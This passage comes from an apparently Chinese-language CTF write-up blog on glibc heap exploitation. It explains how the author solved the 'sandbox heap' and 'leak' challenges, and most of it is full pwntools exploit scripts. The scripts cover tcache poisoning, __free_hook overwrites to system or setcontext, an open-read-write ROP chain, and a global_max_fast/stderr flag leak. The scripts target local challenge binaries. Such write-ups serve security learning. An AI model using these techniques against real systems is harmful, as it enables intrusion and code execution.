class="string">b&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="number">-4111520</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base = <span class="subst">&#123;hex(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">free_hook_addr = libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;free_hook_addr = <span class="subst">&#123;hex(free_hook_addr)&#125;</span>&quot;</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload = bin(free_hook_addr)[<span class="number">2</span>:][::<span class="number">-1</span>].ljust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">9</span>,payload)</span><br><span class="line">create(<span class="number">12</span>,<span class="number">0x88</span>)</span><br><span class="line">create(<span class="number">13</span>,<span class="number">0x88</span>)</span><br><span class="line"><span class="comment">#one_gadget = libc_base+one[1]</span></span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = bin(sys_addr)[<span class="number">2</span>:][::<span class="number">-1</span>].ljust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">13</span>,payload)</span><br><span class="line">edit(<span class="number">10</span>,bin(u64(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))[<span class="number">2</span>:][::<span class="number">-1</span>].ljust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="sandbox-heap"><a href="#sandbox-heap" class="headerlink" title="sandbox heap"></a>sandbox heap</h2><p>这个其实类似<code>bitheap</code>，不同的是加了一个沙盒。这个沙盒没有怎么研究，回头看一下其他师傅的blog学习一下。然后大致思路是一样的，只不过就把free hook改成了<code>setcontext+53</code> 修改了沙盒需要的寄存器值然后进行<code>orw</code>利用就行了</p><p>值得注意的是，当通过调用free hook而调用<code>setcontext+53</code>时，此时的<code>rdi</code>寄存器的值为所free的堆块首址，所以我们需要提前在堆块上布置好设置的寄存器值然后再free这个堆块。然后进行栈迁移到另一个堆块上面执行我们的<code>orw</code></p><p>泄露libc的方法和刚刚一样，然后就是泄露堆块地址的方法。还是那俩指向同一堆块的指针，delete掉之后那个堆就放入了tcache bin，然后在poisoning之前先show一下就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./sandboxheap&quot;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">one = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    <span class="comment">#return io.recvline()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">translate</span>(<span class="params">s</span>):</span></span><br><span class="line">    ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        ans+=bin(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">st</span>):</span></span><br><span class="line">    tar=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> st:</span><br><span class="line">        b=(bin(i)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)[::<span class="number">-1</span>])</span><br><span class="line">        tar+=b</span><br><span class="line">    <span class="keyword">return</span> tar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">    create(i,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+<span class="string">b&#x27;00000100&#x27;</span>+<span class="string">b&#x27;10000000&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;00000000&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    create(i,<span class="number">0x88</span>)</span><br><span class="line">create(<span class="number">9</span>,<span class="number">0x88</span>) <span class="comment">#8 9</span></span><br><span class="line"><span class="comment">#create(11,0x88)</span></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="number">-4111520</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base = <span class="subst">&#123;hex(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">free_hook_addr = libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;free_hook_addr = <span class="subst">&#123;hex(free_hook_addr)&#125;</span>&quot;</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">b&#x27;1&#x27;</span>*(<span class="number">8</span>*<span class="number">8</span>))</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="number">-0x010</span></span><br><span class="line">log.success(<span class="string">f&quot;heap_addr = <span class="subst">&#123;hex(heap_base)&#125;</span>&quot;</span>)</span><br><span class="line">payload = bin(free_hook_addr)[<span class="number">2</span>:][::<span class="number">-1</span>].ljust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>,payload) <span class="comment">#修改tcachebin的fd，申请free_hook附近地址</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">11</span>,<span class="number">0x88</span>) <span class="comment">#9</span></span><br><span class="line">create(<span class="number">12</span>,<span class="number">0x88</span>) <span class="comment">#free_hook</span></span><br><span class="line">create(<span class="number">13</span>,<span class="number">0x110</span>)</span><br><span class="line">create(<span class="number">14</span>,<span class="number">0x110</span>)<span class="comment">#</span></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">53</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x0000000000130514</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000001b500</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000d2625</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = bin(<span class="number">0x67616c662f2e</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;\x00&#x27;</span>).encode()[::<span class="number">-1</span>]</span><br><span class="line">edit(<span class="number">0</span>,flag)</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_base+<span class="number">0xac0</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line">frame.rsi = heap_base+<span class="number">0xac0</span></span><br><span class="line">frame.rdx = <span class="number">0x200</span></span><br><span class="line">frame.rip = libc.symbols[<span class="string">&quot;read&quot;</span>]+libc_base</span><br><span class="line">print(frame)</span><br><span class="line">frame = translate(bytes(frame))</span><br><span class="line"><span class="comment">#print(translate(bytes(frame)))</span></span><br><span class="line"><span class="comment">#print(convert(bytes(frame)))</span></span><br><span class="line">orw = p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">0x2710</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(heap_base + <span class="number">0x5c0</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_base + <span class="number">0x5b0</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_base + <span class="number">0x5b0</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line"><span class="comment">#print(len(orw))</span></span><br><span class="line"><span class="comment">#debug(&#x27;p setcontext&#x27;)</span></span><br><span class="line">edit(<span class="number">13</span>,frame)</span><br><span class="line">edit(<span class="number">12</span>,bin(setcontext)[<span class="number">2</span>:][::<span class="number">-1</span>].ljust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># delete(13) </span></span><br><span class="line">delete(<span class="number">13</span>)<span class="comment">#调用setcontext,由于free_hook,此时rdi为堆首址(no.13)</span></span><br><span class="line">io.sendline(orw)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><p>这道题也是赛后复现的，不过挺有收获的。在其他师傅们的blog中可以大致发现有两种方法。核心的思想就是通过修改<code>_IO_2_1_stderr</code>或者 <code>stdout</code> 修改其中的<code>flag</code>字段 ，然后在其中的<code>_IO_write_base</code>与<code>_IO_write_ptr</code>字段上写上堆地址。然后程序在<code>exit</code>的时候会刷新<code>IO_list_all</code>链表，如果结构体的<code>_IO_write_base</code>与<code>_IO_write_ptr</code>字段之间有数据，那么就会输出。而这道题就是提前把<code>flag</code>读到了堆上，所以能输出堆上内容即可。</p><p>主要问题是如何写这个堆地址，主要有两种，一个是<code>fastbin reverse into tcache</code> ,还有就是修改<code>global_max_fast</code> </p><h3 id="修改global-max-fast"><a href="#修改global-max-fast" class="headerlink" title="修改global_max_fast"></a>修改global_max_fast</h3><p>这个方法的主要想法就是利用<code>tcachebin poisoning</code> 来申请到<code>global_max_fast</code>附近的堆块，对其进行修改。然后释放两块合适大小的<code>chunk</code>,由于<code>global_max_fast</code>被更改，此堆块被认为是放入<code>fastbin</code>从而在<code>fastbinY</code>数组写这俩堆地址的时候越界写，让相应的堆地址落入<code>_IO_write_base</code>与<code>_IO_write_ptr</code>。这样合适调整之后<code>exit</code>的时候就会输出这两个字段之间的内容。但是由于放<code>flag</code>字符串的堆块在上面一点，所以我们还要再<code>tcachebin poisoning</code>一次，申请<code>_IO_2_1_stderr</code>，修改一下 <code>_IO_write_base</code>的尾字节，然后修改一下结构体的<code>_flag</code>字段</p><p>因为要申请两个在<code>libc</code>附近的块，所以我们干脆一起申请了</p><p>我们首先创立9个堆块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0x50</span>)</span><br><span class="line">create(<span class="number">3</span>,<span class="number">0x410</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="number">0x50</span>)</span><br><span class="line">create(<span class="number">15</span>,<span class="number">0x14b0</span>)</span><br><span class="line">create(<span class="number">14</span>,<span class="number">0x14c0</span>)</span><br><span class="line">create(<span class="number">7</span>,<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><p>其中0、1、2是用来申请<code>global_max_fast</code>附近的，4、5用来申请<code>_IO_2_1_stderr</code>附近的(这里最好用不同大小的错开一下，我之前用相同大小的容易在free的时候crash掉，没研究为啥x)。3号堆块是用来放入<code>unsorted bin</code>进而获取<code>main_arena</code> 地址然后再改写，为<code>tcachebin poisoning</code>做准备的(因为这题没有<code>show</code>,我们不能获取libc地址，只能通过覆写的方式)。14、15是为了之后free然后写上堆地址的。7是为了不与top chunk合并</p><p>然后把前面5个给free掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>此时情况如下</p><p><img src="https://s2.loli.net/2022/11/08/5GtLouYasHrn9kB.png" alt=""></p><p>这里需要注意一下free的顺序，因为我们覆写chunk的fd指针的时候只覆写最后一个字节，所以要保证前面是一样的。</p><p>就比如我们现在<code>tcachebin</code>中0x50的顺序是 0—-&gt;1—-&gt;2,我们会写<code>chunk 1</code>的fd指针，因为<code>chunk 0</code>的<code>fd</code>指针指向的<code>chunk 1</code>地址(准确说是userdata地址)为xxxx2a0,就算覆写也只能覆写为xxxx2f0,无法改到unsortedbin的块那里</p><p>然后覆写<code>chunk 1</code>的<code>fd</code>指针指向<code>unsorted bin</code>那里,并且修改<code>unsorted bin</code>的chunk的libc地址末两个字节改成<code>global_max_fast</code>末两个字节</p><p>需要注意的是写的是<code>\xf0</code>而不是<code>\xe0</code> ，因为<code>tcachebin</code>中的chunk的指针是连userdata而不是chunk的头的</p><p>此时情况如下</p><p><img src="https://s2.loli.net/2022/11/08/Bw3I6F2ohp9z84O.png" alt=""></p><p>然后连着申请4次0x50大小的chunk，第四次的时候就能申请到<code>global_max_fast</code></p><p>对0x60的堆块重复类似过程就能申请到<code>_IO_2_1_stderr</code>附近地址，然后按顺序:写<code>global_max_fast</code>——-&gt;free掉俩大chunk——-&gt;修改<code>_IO_2_1_stderr</code>的<code>_flag</code>字段以及<code>_IO_write_base</code>的末字节——-&gt;<code>exit</code> 即可(注意是按顺序，因为只有写了<code>global_max_fast</code>,free掉chunk的时候才会把堆地址写上，然后修改末字节才有用)</p><p>过程需要爆破大概256次(应该是略少于256次，没深入研究过)。主要是修改<code>unsorted bin</code>的chunk的libc地址末两个字节改成<code>global_max_fast</code>末两个字节时，最后一个字节肯定是确定的，而倒数第二个字节有半个字节不确定(因为分页固定大小是0x100),申请<code>_IO_2_1_stderr</code>同理</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">  create(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">  create(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">  create(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line">  create(<span class="number">4</span>,<span class="number">0x50</span>)</span><br><span class="line">  create(<span class="number">3</span>,<span class="number">0x410</span>)</span><br><span class="line">  create(<span class="number">5</span>,<span class="number">0x50</span>)</span><br><span class="line">  <span class="comment">#create(6,0x50)</span></span><br><span class="line">  <span class="comment">#debug()</span></span><br><span class="line">  create(<span class="number">15</span>,<span class="number">0x14b0</span>)</span><br><span class="line">  create(<span class="number">14</span>,<span class="number">0x14c0</span>)</span><br><span class="line">  create(<span class="number">7</span>,<span class="number">0x10</span>)</span><br><span class="line">  delete(<span class="number">2</span>)</span><br><span class="line">  delete(<span class="number">1</span>)</span><br><span class="line">  delete(<span class="number">0</span>)</span><br><span class="line">  delete(<span class="number">3</span>)</span><br><span class="line">  delete(<span class="number">4</span>)</span><br><span class="line">  delete(<span class="number">5</span>)</span><br><span class="line">  <span class="comment">#debug()</span></span><br><span class="line">  edit(<span class="number">1</span>,<span class="string">b&#x27;\xf0&#x27;</span>)</span><br><span class="line">  edit(<span class="number">3</span>,<span class="string">b&#x27;\x40\xf9&#x27;</span>)</span><br><span class="line">  debug()</span><br><span class="line">  create(<span class="number">6</span>,<span class="number">0x40</span>)</span><br><span class="line">  create(<span class="number">8</span>,<span class="number">0x40</span>)</span><br><span class="line">  create(<span class="number">9</span>,<span class="number">0x40</span>)</span><br><span class="line">  create(<span class="number">10</span>,<span class="number">0x40</span>)<span class="comment"># global_max_fast</span></span><br><span class="line">  <span class="comment">#debug()</span></span><br><span class="line">  edit(<span class="number">5</span>,<span class="string">b&#x27;\xf0&#x27;</span>)</span><br><span class="line">  edit(<span class="number">3</span>,<span class="string">b&#x27;\x80\xe6&#x27;</span>)</span><br><span class="line">  create(<span class="number">11</span>,<span class="number">0x50</span>)</span><br><span class="line">  create(<span class="number">12</span>,<span class="number">0x50</span>)</span><br><span class="line">  create(<span class="number">13</span>,<span class="number">0x50</span>)<span class="comment"># _IO_2_1_stderr</span></span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line">  <span class="comment">#debug()</span></span><br><span class="line">  <span class="comment">#debug</span></span><br><span class="line">  <span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">  edit(<span class="number">10</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">  <span class="comment"># #debug()</span></span><br><span class="line">  delete(<span class="number">14</span>)</span><br><span class="line">  delete(<span class="number">15</span>)</span><br><span class="line">  edit(<span class="number">13</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x90&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line">  <span class="comment">#debug()</span></span><br><span class="line">  io.sendlineafter(<span 